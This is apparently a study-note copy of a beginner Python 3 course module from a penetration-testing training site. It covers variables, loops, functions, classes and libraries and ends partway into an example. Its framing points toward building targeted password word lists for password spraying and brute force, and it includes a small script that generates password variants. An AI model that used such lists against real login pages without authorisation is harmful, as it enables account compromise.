# Introduction to Python 3

Tags: #🧑‍🎓
Related to: [[python]]
See also:
Previous: [[HTB Academy]]

![[logo_introduction_to_python_3.png]]

Automating tedious or otherwise impossible tasks is highly valued during both penetration testing engagements and everyday life. Introduction to Python 3 aims to introduce the student to the world of scripting with Python 3 and covers the essential building blocks needed for a beginner to understand programming. Some advanced topics are also covered for the more experienced student. In a guided fashion and starting soft, the final goal of this module is to equip the reader with enough know-how to be able to implement simple yet useful pieces of software.

### Module Summary

This module introduces programming with Python 3 and guides the reader through writing simple yet useful pieces of software, little by little. Starting gently with the essential building blocks, we will work our way through different techniques and functional data structures and end up with working software that is easy to modify and add new features to.

In this module, we will, among other topics, cover:

-   A short introduction to Python 3 as a language
-   Variables and simple data structures
-   Working with loops and program control
-   Working with functions, classes, and modules

The module is broken down into smaller sections in which we will cover not just the different, newly introduced concepts but also how we can utilize these to improve the code. The module contains small exercises that will help connect the dots, and most sections of the module will include a fair bit of code and thorough breakdowns of the additions and changes made to it. It is recommended to follow along by typing out everything by hand as additional practice.

The final goal of this module is to equip the reader with enough know-how to be able to implement simple pieces of software, for example, a website word extractor. Homemade tools like these will, in some situations, help the author overcome otherwise very challenging obstacles. The example program we will be making - the word extractor - will, in the end, enable us to generate a list of the most common words of a certain length found on a particular website. A list like this could be used to create a targeted word list for password spraying against an exposed company login page or brute force attacks when combined with other tools.

You can start and stop the module at any time and pick up where you left off. There is no time limit or "grading," but you must complete all of the exercises and the skills assessment to receive the maximum number of cubes and have this module marked as complete in any paths you have chosen.

The module is classified as "Easy". Still, it assumes a working knowledge of using a command-line terminal to perform basic operations such as running the code or installing a Python package. This module further assumes that Python version 3.7.x or later is installed on your local computer already for the full experience.

A firm grasp of the following modules can be considered prerequisites for successful completion of this module:

-   Learning Process
-   Linux Fundamentals

# Introduction to Python 3

## What is Python?

* * * * *

Welcome to `Introduction to Python 3`. This module will cover most of the essentials you need to know to get started with Python scripting. Whether you have a background in IT or just starting, this module will attempt to `guide you through` the process of creating small but useful scripts. This module will present to you an amount of code that will, depending on your previous experience, seem just enough or quite a lot. But fear not, we will get through this together.

So why even learn Python, one might ask? Python is one of the `most popular` scripting languages currently. This makes it a popular choice for `automation` of everyday tasks or the development of `tools`. In the InfoSec world, plenty of so-called PoCs (Proof of Concepts) are written in Python, as are many popular tools for penetration testing. The simplicity of the language makes it appealing to use when a need to "just write something quickly" arises. Yet, the language's flexibility and community support also make it a perfect candidate for larger projects. Whether you need to write a simple script that will automate a repetitive task on a website, crawling or analyzing large amounts of data, performing buffer overflow attacks, creating an interactive service, or something completely different, Python makes development easy.

Python is an `interpreted language`, which means the code itself is not compiled into machine code like C code. Instead, it is interpreted by the Python program, and the instructions in the script(s) are executed. Python is a high-level language meaning the scripts we produce are simplified for our convenience so that we do not need to worry about memory management, system calls, and so forth. Furthermore, Python is a `general-purpose`, `multi-paradigm` language that is a fancy way of saying "you can use it for most things with ease" and "it doesn't mind if you prefer one style or another."

As for the coding style, we will gently touch on the object-oriented style because this makes reasoning about code a lot simpler. Essentially, object-oriented programming will likely feel less intimidating if you've ever played with either blocks or bricks of either digital or physical form. Lastly, Python is rumored to be easy to read, especially in the beginning. This may be because of its close resemblance to the English language and its strict requirements for proper code indentation.

In this module, there will be code examples and lots of them. It is highly recommended that you type out all of the code by hand as you read along and refrain from copying and pasting. This will help you get in the flow and will help you remember what you learned. It is also highly recommended to explore and play around with the tools and techniques taught in this module. It is assumed that Python 3 is already installed on your system and that the Python 3 executable is in the PATH. A web-based virtual machine with Python 3 already installed and configured properly will be provided for all relevant sections.

Once again, welcome to the module.

# Python Fundamentals

## Executing Python Code

* * * * *

There are many ways to execute a piece of Python code. Two of the most frequently used methods are running the code from a `.py` file and running it directly inside the Python [IDLE](https://docs.python.org/3/library/idle.html), Integrated Development and Learning Environment. In this section, we will look at how to run code both ways. The file-based way is handy when developing an actual script and the IDLE way is very useful for quickly testing something small. We will start with the file-based approach.

* * * * *

### Python3
-------

Let's start with a widespread, first piece of code that prints out "Hello world" to the terminal or screen. In Python, it looks like this:

#### welcome.py

```python
print("Hello Academy!")
```

If we run this script, the string `"Hello Academy!"` will be printed to the terminal. To try it out, we open a text editor, type in the above, and save the file as `welcome.py`. Next, we try running it by executing `python3 welcome.py`.

	vim welcome.py
	python3 welcome.py

```text
Hello Academy!
```

* * * * *

### IDLE
----

We can utilize `IDLE`, Python's own integrated development environment, directly in our terminal for quicker prototyping. We launch this by executing the Python binary without any arguments. Within this, we can have it evaluate simple math equations, e.g., `4 + 2`, or store and use variables. When evaluating an expression, the result will be printed on the line below if a result is returned. However, if the expression is stored as a variable, nothing will be printed as nothing is returned (it is all contained in the variable). We can also import libraries and define functions and classes directly in the IDLE for usage in the same session. We will dive deeper into libraries, functions, and classes later on. To exit the IDLE again, we type `exit(0)`. The number `0` is the [return code](https://en.wikipedia.org/wiki/Exit_status) of the Python process, where 0 means all is OK and a number different from 0 indicates an error. Consider this example of how to use IDLE:

#### Python IDLE

	python3

```python
>>> 4 + 3
7
>>> foo = 3 * 5
>>> foo
15
>>> foo + 4
19
>>> print('Hello Academy!')
Hello Academy!
>>> exit(0)
```

Python executes the code from top to bottom. This is important to keep in mind when writing Python scripts because Python has no clue what is further down in the script until it gets to it. If we were to print a variable instead of a literal value, it must be defined before referencing. For example:

#### Hello Again, Academy

```python
>>> greeting = 'Hello again, Academy'
>>> print(greeting)
Hello again, Academy
```

However, we can print the output of not only one variable but of several in different variations.

#### Printing Multiple Variables

```python
>>> a = 'HTB'
>>> b = 'Academy'
>>> print(a, b)
HTB Academy
```

* * * * *

### Shebang
-------

Another method is based on adding the [shebang](https://en.wikipedia.org/wiki/Shebang_%28Unix%29#Portability) (`#!/usr/bin/env python3`) in the first line of a Python script. On Unix-based operating systems, marking this with a pound sign and an exclamation mark causes the following command to be executed along with all of the specified arguments when the program is called. We can give the Python script execution rights and execute it directly without entering `python` at the beginning on the command line. The file name is then passed as an argument.

#### welcome.py

```python
#!/usr/bin/env python3

print("Hello Academy!")
```

#### Shebang Execution

	chmod +x welcome.py
	./welcome.py

```text
Hello Academy!
```

## Introduction to Variables

* * * * *

Let us assume for a moment that we are tasked with doing a penetration test for a client with a locked-down user environment. While investigating our options for our `Assume Breach` test, i.e., a test assuming that we have already successfully compromised a regular user account and machine through phishing, we discover that we can run Python scripts. We can produce a list of potential user accounts, and we would also like to have a `target specific` list of potential passwords. We notice that the client's website contains many `buzzwords`, and we wonder if some users used variations of product names as their passwords. For this, we need to write a simple script that can produce a list of a website's most frequently occurring words. Since the client wants to get a copy, we will try our best to make the script easy to read and maintain.

Before we get ahead of ourselves, we need to carve out the essential building blocks. For this, let us talk about math. Math and programming have some things in common: both use variables and constants a fair bit, and both have functions. In Python, a variable is our way of storing a value of some sort in memory. For example, a number, some text, or the bytes of an image. Like in math, variables have a name that we make up, but the names should be descriptive in Python. Below are some examples:

#### A Few Simple Variables

```python
advice = "Don't panic"
ultimate_answer = 42
potential_question = 6 * 7
confident = True
something_false = False
problems = None
# Oh, and by the way, this is a comment. We can tell by the leading # sign.
```

#### Strings

The first variable, `advice`, is a `string`. Strings in Python can be specified using both `"double quotes"` and `'single quotes'`. When typing out strings that contain either symbol as a natural part of the string itself, e.g., `don't lie`, it is a good idea to use the `other` kind of quotes. Writing `"don't lie"` works just fine. However, using single quotes would throw an error.

#### Integers

Following the `advice` variable comes two numbers, or `integers`, the first of which is a number. The second variable, `potential_question`, is also a number but not until `runtime`. During runtime, the equation `6 * 7` is evaluated to `42`, which is then stored as the variable.

#### Booleans

Following the number variables come two `boolean` variables, `confident` and `something_false`. A boolean value is a truth value and can be either `True` or `False`. These will come in handy later. Right after comes the variable `problems`, which is set to `None`. [None](https://realpython.com/null-in-python/#:~:text=Python%20uses%20the%20keyword%20None,and%20a%20first%2Dclass%20citizen!) is a special "nothingness" of a value similar to `null` in other languages. The usefulness of this value is, among other things, that it allows us to `define variables` in the code but not give them a concrete value just yet. It also allows us to create a more meaningful program flow and decide to pass along `either` some data `or` `None`, e.g., in case of errors. Moreover, it allows us to return it as a value if "none of something" was found. This also enhances the program flow and readability.

#### Comments

Lastly, we see a comment. Comments work the same way in Python as they do in all other languages: they are ignored when the program runs and are only for the developers' eyes. It can sometimes be advisible to use comments to remember what a piece of code does or explain some oddity. However, it is strongly recommended to write clean and simple code that will not need further explanation other than the code itself. This is not always the easiest way to get started, but we will try to aim for this later.

* * * * *

### Combining Variables
-------------------

Let us go through a few examples to see how all these variables can also be combined. Later on, whether for our projects or specific tasks, we will want to output variables (and thus also their contents) together. Therefore, let us first briefly go through some basic math operations with Python.

#### Basic Math Operations

```python
>>> 10 + 10		# Addition
20
>>> 20 - 10		# Subtraction
10
>>> 5 * 5		# Multiplication
25
>>> 10 / 5		# Division
2
```

For all of these values we can define variables to store them. As for the name itself, we can name them as we please, however with a few exceptions e.g. they must begin with a letter or `_`.

#### Saving Values to Variables

```python
>>> add = 10 + 10
>>> sub = 20 - 10
>>> multi = 5 * 5
>>> div = 10 / 5
>>>
>>> print(add, sub, multi, div)
20 10 25 2
```

This also allows us to work with the values stored in the individual variables.

#### Working with Variables

```python
...SNIP...
>>> print(add, sub, multi, div)
20 10 25 2
>>> result = (add * sub) - (multi * div)		# (20 * 10) - (25 * 2)
>>> print('Result: ', result)
Result:  150
```

Another handy feature of the Python interpreter is that the IDLE assigns the latest expression to the variable `_`. This allows us to continue working with the last value.

```python
>>> 38 + 4
42
>>> 50 - _		# 50 - 42
8
```

Note however that this is true *only* for IDLE. In regular Python code that is run from `.py` files e.g. from the command line or in an Integrated Development Environment, `_` is simply just a variable. It is often used as a placeholder for values we do not care about, for example if a function returns two values, but only one of them is important to us, for example `x_coord, _ = get_position_of_birb()`. This is to show other developers, and ourselves a few months into the future, that the value returned, e.g. the y-coordinate from the previous example, is not needed.

* * * * *

### Coding Style
------------

In Python, variable names follow the [snake_case](https://en.wikipedia.org/wiki/Snake_case) naming convention. This means that variable names should be all lower case initially, and an underscore should separate any potential need for multiple words in the name. While ignoring these naming conventions will not cause any issues for the script - Python could care less about what we call our things - other Python developers may get thrown off if they expect one set of rules but face others.

The main point here is that our code should be easy to follow and read. Every programmer has their style and preferences when it comes to writing code. There are even several style guides for Python, such as [PEP8](https://www.python.org/dev/peps/pep-0008/#type-variable-names), which describes certain types of variable or function definitions. Having a style guide is very important when we want someone to read the code we write. We usually write code so that someone can use it, benefit from it and possibly work on it or learn something new from it. Without a style guide, debugging, improving, or extending becomes immensely difficult. Of course, there are many other things besides the style guide that we as professional programmers need to pay attention to, such as code architecture, general principles for code quality, etc.

## Conditional Statements and Loops

* * * * *

Now let us spice things up a little. This section will go over conditional statements - ifs and elses - and various types of loops. Below is an example of what an if/else `block` of code looks like, i.e., the amount of code that constitutes a particular technique and is visually grouped (typically indented at the same level).

#### A Simple Feature Switch

```python
happy = True

if happy:
    print("Happy and we know it!")
else:
    print("Not happy...")
```

A few things happened here already. Pay close attention to the indentation of the code. Python does not require how wide each indentation must be, as long as there is `consistency`. Some people prefer two spaces, others 4. Some people prefer a single tab character. We will continue to use four spaces going forward.

Besides indentations, two new keywords are used here: `if` and `else`. First, we define a variable which, for the sake of demonstration, is currently TRUE. Then we check `if` the variable `happy` is `True` (`if some_var` is easier to read but also shorthand for `if some_var == True`), and if it is `True`, then we print "Happy and we know it!" to the terminal. If `happy` is `not` `True`, i.e., it is `False`, then the `else` block is executed instead, and "Not happy..." is printed to the terminal.

Nevertheless, we also have to consider the situation that we want to bring in more than just two different options. The `elif` (else-if) expression means that we continue with this one if the previous condition is not met. Basically, `elif` is the shortened notation of nested `if` statements.

#### If-Elif-Else Statement

```python
happy = 2

if happy == 1:
    print("Happy and we know it!")
elif happy == 2:
    print("Excited about it!")
else:
    print("Not happy...")
```

This brings us to the first type of loop: the `while-loop`. Consider the below code:

#### The While-Loop

```python
counter = 0

while counter < 5:
    print(f'Hello #{counter}')
    counter = counter + 1
```

Before we dive into the code, it is essential to know how a while-loop works in the first place. A while-loop is a loop that will execute its content (the "block") as long as the defined condition is `True`. This means that `while True` will run forever, and `while False` will never run. By doing what we do in the example, we tell Python to run the contents of the while-loop for as long as the `counter` variable is below 5. Inside the while-loop, we must then remember to increase the `counter` by (at least) 1 every time we make an iteration or eventually, anyway. If we try to run the above example, `print` will be called five times and print the contents of the function.

Now, what are the contents of `print`? Let us quickly talk about formatted strings before continuing with loops. A format string is a string that lets us `populate the string` with values during runtime. A new formatting string was introduced with Python 3.6: the [f-string](https://realpython.com/python-f-strings/) (above example).

While a regular string could look something like `'Hello world'`, an f-string adds an `f` at the beginning: `f'Hello world'`. These particular two strings are of the same value. The benefit of the f-string, however, is that we can swap out parts of the strings with other values and variables by enclosing them in a pair of curly braces, like this:

#### Format Strings

```python
equation = f'The meaning of life might be {6 * 7}.'  # -> The meaning of life might be 42.

me = 'Birb'
greeting = f'Hello {me}!'  # -> Hello Birb!
```

Now that we know that a while-loop is a loop that continues to execute `while` some condition is true, and we know that `f'Hello #{counter}'` will equal `Hello #` followed by the number of the iteration - starting at 0 - we are ready to try to execute the code!

#### While-Loop

	vim loop1.py
	python3 loop1.py

```text
Hello #0
Hello #1
Hello #2
Hello #3
Hello #4
```

Once again: the loop checks if the counter, which is set to 0 initially, is below 5 - it is - and then prints "Hello #0" and sets the `counter` variable to the value of itself (0) + 1. Next iteration, it checks if `counter`, which is now 1, is less than 5 - it is - and then prints "Hello #1" and sets `counter` to the value of itself (1) + 1. On the 3rd iteration, `counter` is 2 (because we started at 0), and so forth.

In the next section, we will continue looking at loops, but this time a simpler type of loop and one we will be favoring over the other as much as possible.

* * * * *

### Loops and Lists
---------------

Recall from the previous section that a loop is a block of code that keeps iterating the contents until some condition is met. This section will look at one kind of loops often referred to as the "for-each loop". This is a loop that iterates over `each element` in some collection of elements and does something `for each` individual element. Consider the below line of code:

#### A List of Strings

```python
groceries = ['Walnuts', 'Grapes', 'Bird seeds']
```

This is a list of strings. The square brackets indicate a list, and the comma-separated values inside of it are strings. Similarly, `[]` is an empty list, and `[42]` is a list with just one element, the `int` value `42`. When pointing out values inside lists, Python numbers the elements in a list from 0 and upwards. This means that the above list has `three elements` and that `the first` element is at `index 0`. The second element is at index 1, and the third element is at index 2. Like so:

#### Value Indexes

```python
groceries = ['Walnuts', 'Grapes', 'Bird seeds']
# index:         0          1          2
```

We can also write lists the following way for easier readability (especially with much larger lists):

#### Alternative Syntax

```python
groceries = [
    'Walnuts',    # index 0
    'Grapes',     # index 1
    'Bird seeds'  # index 2
]
```

The last thing to mention about lists before we move on is how to retrieve an element from the list. Say we want to print the first element to the console. This is done by referencing the variable name of the list, e.g., `groceries` and which index is desired like so: `groceries[0]` to get the first element, `'Walnuts'`. The last element, `'Bird seeds'` would in this example then be `groceries[2]` because the value `'Bird seeds'` is located at index 2 in the list. Python can even count backward, so we could also have gotten the last element of the list - regardless of how many elements are in it - by asking for index -1: `groceries[-1]`. It works the same way we did with strings.

#### Strings Indexing

Strings can also be indexed. This is especially useful when we want to filter out certain parts of some output. We can think of each word as a list of letters with indexes. However, there is also the negative index, which allows us to start counting the string letters from the end. Let us take the following string as an example: `ABCDEF`

| Negative Index | Index | Character |
| --- | --- | --- |
| `-6` | `0` | A |
| `-5` | `1` | B |
| `-4` | `2` | C |
| `-3` | `3` | D |
| `-2` | `4` | E |
| `-1` | `5` | F |

We use the index to tell Python which letter we want to output from it. In this example, we want to output the first and the last letter.

```python
>>> var = "ABCDEF"
>>> print(var[0], var[1], var[2], var[3], var[4], var[5])
A B C D E F
>>> print(var[-1], var[-2], var[-3], var[-4], var[-5], var[-6])
F E D C B A
```

We can also work with these indexes to give us particular substrings.

#### Substrings

```python
>>> var = "ABCDEF"
>>> print(var[:2])	# Up to index 2
AB
>>> print(var[2:])	# Ignore everything up to index 2
CDEF
>>> print(var[2:4])	# Everything between index 2 and 4 ("2" is counted)
CD
>>> print(var[-2:])	# Up to negative index 2 (last two characters)
EF
```

* * * * *

### For-Each Loop
-------------

As already mentioned, Python allows us to loop over each element (or value) in a list. Consider the below piece of code where we at first have defined a list and then the loop.

#### The For-Each Loop

```python
groceries = ['Walnuts', 'Grapes', 'Bird seeds']

for food in groceries:
    print(f'I bought some {food} today.')
```

The for-each loop is structured this way: first the `for` keyword, then the variable name we choose, followed by the `in` keyword and a collection to iterate over. In this example, we told Python to run the code inside the block "for each element," where we then call the current element `food`. We then tell Python where to find these elements, which in this case is inside `groceries`". Let us break the entire iteration process down.

At the start of the first iteration, a variable `food` is set to the first value in `groceries`, `'Walnuts'`. Then we print `'I bought some Walnuts today.'` because the f-string inserts the current value of `food` into the string. We then repeat the process; however, `food` is set to the `second` element in the list `'Grapes'`. The third time around, `food` is set to the last element in the list of three elements, `'Bird seeds'`, because we asked Python to run the print `for` each element in the list.

Try to implement the example in a new Python script and run it. It should look something like this:

#### While-Loop

	vim groceries.py
	python3 groceries.py

```text
I bought some Walnuts today.
I bought some Grapes today.
I bought some Bird seeds today.
```

>Note that in Python we can iterate over each element produced by a "generator" as well as a collection of data. We will not be covering generators in this module, because we usually don't need to worry about them when writing Python programs.

### Exercises
---------

Below are the relevant code blocks for the exercises in this section.

#### Code Block 1

```python
list_1  = [5, 3, 'Cake', True, 4, 5]
```

#### Code Block 2

```python
list_2 = [4, 3, 2, 1]

for num in list_2:
    __________
```

#### Code Block 3

```python
list_3 = ['Accidental', '4daa7fe9', 'eM131Me', 'Y!.90']
secret = []

for x in list_3:
    secret.append(x[:2])

print(''.join(secret))
```

#### Questions

>How long is list_1 ?

>In "Code block 2" the blank should be filled with what, to output all numbers in a terminal?

>What is the result of running the code in "Code block 3"?

# Keeping It Simple and Smart

## Defining Functions

* * * * *

So far, we have been looking at common techniques for controlling code flow, making it possible for us to build simple tools, for example, counters or even a simple wordlist enricher. For example: for each word in the wordlist, first set the counter to 0, while the counter is less than 100, print the word and the counter and increase the counter by 1. For reference, this could look something like this:

#### Password Generator Example

```python
wordlist = ['password', 'john', 'qwerty', 'admin']

for word in wordlist:
    counter = 0
    while counter < 100:
        print(f'{word}{counter}')
        counter = counter + 1
```

In this case, the for-loop repeats the loop until it has processed all entries from the list. As shown, even with simple building blocks, we can achieve a lot. Let us talk about the following important building block in software: `Functions`

* * * * *

### Functions
---------

Functions let us define code blocks that perform a range of actions, produce a range of values, and optionally return one or more of these values. Like in math, where `f(x)` is a `function f of x` and produces the same result when given the same input. For example `f(x) = x + 1` is a function `f` of `x` which returns `x + 1`. Thus `f(2)` would be `3`, because `f(2) = 2 + 1` which is `3`.

Similarly, in Python, we can define and call functions to reuse code and work with our data more efficiently - as we do not need to reinvent the wheel all the time. We can define functions in Python in their simplest form very easily.

Here is an example of defining `f(x) = 2 * x + 5` as a function in Python:

#### First Function

```python
def f(x):
    return 2 * x + 5
```

Besides the (essential) syntax with indentation at the `inner scope` of the function - the code inside the function - what is important to note here are the `def` and `return` keywords. The `def` keyword is how we define functions in Python. Following `def` comes the function name (written in snake_case), input parameters inside the parentheses, and a colon. This first line of a function is called the `signature` of the function. After having written a couple of different functions, we can tell them apart by simply looking at their names and the arguments they accept. We can tell them apart by comparing their function signatures.

Let us create a function to calculate and return that one value to the power of another value:

#### Power_Of Function

```python
def power_of(x, exponent):
    return x ** exponent
```

In Python, the `**` symbols mean "power of". If we call `power_of(4, 2)`, we will get back four-to-the-power-of-two or simply four squared. Now, where does this result end up? It will end up in one of two places, depending on what we do: 1) the empty void of nothingness, 2) a variable. Consider this example:

#### Function Call

```python
def power_of(x, exponent):
    return x ** exponent

power_of(4, 2)  		# The function was run, but nothing caught the return value.
eight = power_of(2, 3)  # Variable "eight" is now equal to two-to-the-power-of-three.
```

So is the first form pointless, then? No. As with the input/output of a terminal, we can "pipe" the function's output to the "input" of another. We can use the result of calling a function as the input for another one. For example:

```python
print('My favourite number is:')
print(power_of(4, 2))
```

Here we are calling the function `print` and giving it first a string as input, and next, we are giving it `the result` of another function call. At `runtime`, during the script's actual execution, Python will first execute the first line and then go to the 2nd line and execute the commands from inside out. It will, in other words, start by calculating `power_of(4, 2)` and then use this result as input to the `print` function.

Imagine if we were to call a function with ten parameters. Having to remember each parameter is challenging once the amount of parameters increases above two, so in addition to these `positional` parameters, Python supports what is called `named parameters`. While positional parameters require us to always insert the parameters in the correct order, named parameters let us use whichever order we prefer. However, they require us to specify which value goes to which parameter explicitly. Using named parameters might seem silly, but after a week or a month of looking at other things, it can be a blessing to have expressly specified, by parameter names, which is which. Let us look at an example. Consider the below function, which is a template invitation to a school event.

#### Invitation.py

```python
def print_sample_invitation(mother, father, child, teacher, event):

    # Notice here the use of a multi-line format-string: f''' text here '''
    sample_text = f'''
Dear {mother} and {father}.
{teacher} and I would love to see you both as well as {child} at our {event} tomorrow evening. 

Best regards,
Principal G. Sturgis.
'''
    print(sample_text)

print_sample_invitation()
```

If we were just to fill out the blanks, chances are we would forget who is who within minutes, rather than weeks. Note: the above code will error because we do not provide any arguments for the `print_sample_invitation` function.

What we can do instead is to specify exactly who is who, like so:

```python
print_sample_invitation(mother='Karen', father='John', child='Noah', teacher='Tina', event='Pizza Party')
```

Specifying the names within the function will change our script to this:

#### Invitation.py - Modified

```python
# Defining the function
def print_sample_invitation(mother, father, child, teacher, event):

    # Notice here the use of a multi-line format-string: f''' text here '''
    sample_text = f'''
Dear {mother} and {father}.
{teacher} and I would love to see you both as well as {child} at our {event} tomorrow evening. 

Best regards,
Principal G. Sturgis.
'''
    # Print output
    print(sample_text)

# Call function
print_sample_invitation(mother='Karen', father='John', child='Noah', teacher='Tina', event='Pizza Party')
```

This will produce the following output:

#### Invitation.py - Execution

	python3 invitation.py

```text
Dear Karen and John.
Tina and I would love to see you both as well as Noah at our Pizza Party tomorrow evening.

Best regards,
Principal G. Sturgis.
```

Once again, Python scripts are executed from top to bottom, so always keep in mind that Python needs to know about the functions and variables before they are being referenced. Also, keep in mind the scopes of the code. Scopes let us reference variables and functions `outside` of our current scope (e.g., code in functions can use variables and the global scope), but not `inside` of it. In other words, we cannot reuse a variable we defined inside a function, outside of it. Besides that, Python comes with many different [Built-in Functions](https://docs.python.org/3/library/functions.html).

Now that we know the basics of defining and working with functions, let us add some more building blocks to our arsenal of coding tools: `Classes`

#### Questions

>Write the function signature (def ...) for a function "foo" that has one argument "bar", including the trailing colon.

>When we call a function and explicitly set the value of a parameter, e.g. foo(bar=42), this parameter is called a _____ parameter. (Fill the blank)

>Functions which parameters are not named explicitly are called __________ parameters. (Fill the blank)

## Making Code Classy

* * * * *

In this section, we will talk about classes. And cake. Let us start with the cake. When we have a piece of brownie in front of us, let us, for the sake of argument, say this piece of brownie is an `object` of the food type `Cake`. Our piece of cake has some properties that other pieces of cake might not have. One such property could be the topping which in our case could be chocolate frosting and a cherry. We need to ask ourselves how this piece of cake was produced and what it consists of.

Cooking recipes and classes are much alike because they define how a dish - or some object - is produced. A cake might have a fixed amount of flour and water, but leave it up to the chef to add a chocolate or strawberry frosting. A `class` is a spec of how an object of some type is produced. The result of `instantiating` such a `class` is an object of the class. Let us look at an example:

#### The DreamCake Class

```python
class DreamCake:
    # Measurements are defined in grams or units
    eggs = 4
    sugar = 300 
    milk = 200
    butter = 50
    flour = 250
    baking_soda = 20
    vanilla = 10

    topping = None
    garnish = None

    is_baked = False

    def __init__(self, topping='No topping', garnish='No garnish'):
        self.topping = topping
        self.garnish = garnish
    
    def bake(self):
        self.is_baked = True

    def is_cake_ready(self):
        return self.is_baked
```

Similar to how functions were defined using the `def` keyword, classes are defined using the `class` keyword, followed by the name of the class, in the CapWords naming convention. CapWords means all words used in the name are capitalized and squeezed together, like `CapWordsArePrettyCool`.

Next up come the ingredients that produce a basic (and tasty, by the way) cake, which will never change in this example. The `topping` and `garnish` variables are set to `None` right after space. This suggests that these variables will have concrete values assigned at a later point - in this case, inside the `__init__` function of the class. This function automatically gets called by Python once a new instance of a class is requested. The `__init__` function is a so-called "Magic Method". We will not cover Magic Methods in detail, but a note about them has been included in the optional, advanced part at the bottom.

Getting back to the class, please notice about the `__init__` function, the `self` parameter. This parameter is a `mandatory, first` parameter of `all` class functions. Long story short, classes need a way to refer to their own variables and functions. Python is designed to require a "`self`" parameter in the first position of the function signature. We can then refer to other functions within class functions by calling `self.other_func()` or `self.topping`. Note that we do not need to provide a value for it when calling functions on class objects despite this first' self' parameter. We will see this later.

Another little trick to notice is the default values for function parameters. These allow us to completely commit specifying a value for one or more of the parameters. The parameters will - in that case - then be set to their default values as specified, and `topping` is set to `'No topping'` unless overridden when we create an object.

Lastly, in this example, we have defined a function `inside of the class scope` as dictated by the indentation level. This means that the function `bake` is `only` accessible to code from within the class itself (e.g., code inside one function calling another function) and objects instantiated from the class. Let us create some example objects to illustrate this behavior better.

#### A Plain Cake

The topping and garnish default to "No topping" and "No garnish" for a plain cake, respectively.

```python
plain_cake = DreamCake()
```

#### A Chocolate Cake

We need to add chocolate frosting on top for a chocolate cake, but no garnish (defaults to `"No garnish"`).

```python
chocolate_cake = DreamCake(topping='Chocolate frosting')
```

#### A Luxury Cake

Our luxury cakes have the topping and garnish explicitly set.

```python
luxury_strawberry_cake = DreamCake(topping='Strawberry frosting', garnish='Chocolate bits')
```

This can, of course, also be specified `without` using named parameters for brevity:

```python
luxury_strawberry_cake = DreamCake('Strawberry frosting', 'Chocolate bits')
```

As shown above, classes are instantiated into objects similar to how we call functions: type the name followed by parentheses with possible parameters specified. Now that we have objects of the class `DreamCake` stored in variables, we can call the functions of the class `on` the object variables by appending a `.` and the function.

#### Baking the Cake

```python
chocolate_cake = DreamCake(topping='Chocolate frosting')

chocolate_cake.bake()  # Call the function "bake" on the object.
is_cake_done = chocolate_cake.is_cake_ready()

print(is_cake_done)  # Prints "True" because we called "bake" earlier
```

See the `bake()` function call on the `chocolate_cake`? Even though the `bake` function within the class has a `self` parameter, we do not need to specify its value. We will not dive into the decisions as to why this is, and it is just something to remember. In closing, it is worth mentioning that this code style is a small part of [Object-Oriented Programming (OOP)](https://en.wikipedia.org/wiki/Object-oriented_programming). There is much more to OOP than simply using classes - enough for an entirely separate module - but in its simplest forms, we define classes, create objects (or "instances") of these classes and use them to hold data or call functions.

* * * * *

### Advanced Notes on Classes
-------------------------

If you are new to programming, do not be disheartened if this sounds a little too complicated. It is. The following are very brief notes on some more advanced usages of classes, which we mostly do not need to worry about at all in our day-to-day programming, but which are pretty cool to know about regardless.

One thing I promised to explain briefly is Magic Methods. Magic Methods are functions - or methods as they are also called in many programming languages - which exist by default and have a default implementation in all classes. This is because of the `class hierarchy` in Python, where all classes inherit from a base class `object` ("object" is the name of the base class - slightly confusing perhaps).

This statement opens a large box of OOP that we will not go through, but feel free to research "Python class inheritance" and similar phrases on your own. In short, "class inheritance" means that one class can inherit the type and its functions and internal variables. This base class gives objects some basic functionality, for example, the ability to compare against one another (is one cake the same as another?) or get a `string representation` of the object.

Say we have a class `Circle`, the object itself is raw data stored in memory that only Python knows how to read, but the `string representation` of a `Circle` object could be `"Circle(r=5)"` for example describing a circle with a radius of 5. The Magic Method responsible for returning a string representation of an object is `__str__`. Calling this function on an object is similar to calling `str(...)` with the object as a parameter. For example, consider the following snippet from my Python IDLE:

#### Overriding Magic Methods (IDLE)

```python
>>> class Circle:
...     def __init__(self, radius):
...         self.radius = radius
...
...     def __str__(self):
...         return f'Circle(r={self.radius})'
...
>>> my_circle = Circle(5)
>>> str(my_circle)
'Circle(r=5)'
```

If we did not override the `__str__` function, the code would still work, but the output would be less meaningful:

```python
'<__main__.Circle object at 0x022FFB98>'
```

This string represents a `Circle` object inside `__main__` (here, the IDLE), located at memory address `0x022FFB98`.

Another two Magic Methods worth mentioning are the `__enter__` and `__exit__` functions, allowing us to create classes that support using the `with` keyword. The `with` keyword will enable us to specify the default functionality of a class for build-up and teardown procedures. For example, the class `C2TcpConnection` which represents a TCP connection to a C2 server. The build-up step could include initiating a socket and attempting to authenticate given input from external sources. The teardown step could include proper error handling and a guarantee of properly closing the socket after use. This is advanced but fun and "Pythonic" coding which I recommend you to research.

Let us briefly consider an example before moving on to the next section of the module.

#### Class Supporting WITH Context Manager

```python
class Foo():

    def __enter__(self):
        print("Enter...")

    def __exit__(self, type, value, traceback):
        print("...and exit.")
```

Here a class `Foo` is defined with a simple `__enter__` and `__exit__` function, which does nothing but print a message. This allows us to use the `with` clause to "wrap" this supposed reused boilerplate code around concrete code, for example:

```python
with Foo():
    print("Hello world!")
```

This prints the following to the console:

```text
Enter...
Hello world!
...and exit.
```

Furthermore, we can change the with-clause to something like `with Foo() as foo`, which allows us to reference the instantiated object of `Foo` used to wrap around our code. Doing so is useful if, for example, the `Foo` class has functions we want to call from within the with-clause such as `get_connection_status` in the example of creating a `C2TcpConnection` class. More frequent use of the with clause is `with open('/path/to/file.txt', 'w') as wr`, which opens a file for writing. We can then use `wr.write('something')` to write "something" to the file. At the end of the with-clause, we do not need to close the output streams to the file - the teardown functionality in the `open` class takes care of that.

# The Importance of Libraries

## Introduction to Libraries

* * * * *

We have discussed how to create classes and functions, functions within classes, and other simple concepts. All of this has been inside one Python file, also known as `a module`, but it would be great if we could share the code inside this module with other people or reuse it in other projects. It would also be great to reuse code that other people have made for us, for example, code that lets us communicate with web servers or even something as simple as getting the current date. Enter libraries.

A `library` in programming is in many ways similar to a library in real life. It is a collection of knowledge that we can borrow in our projects without reinventing the wheel. Once we `import` a library, we can use everything inside it, including functions and classes. Some libraries ship along with Python, for example, `datetime`, which lets us get an object representing the current, local date, and time.

Let us see what classes and functions the library `datetime` contains. For that, we will use the built-in function called [dir()](https://docs.python.org/3/library/functions.html#dir).

#### Dir(datetime)

```python
>>> import datetime
>>> dir(datetime)
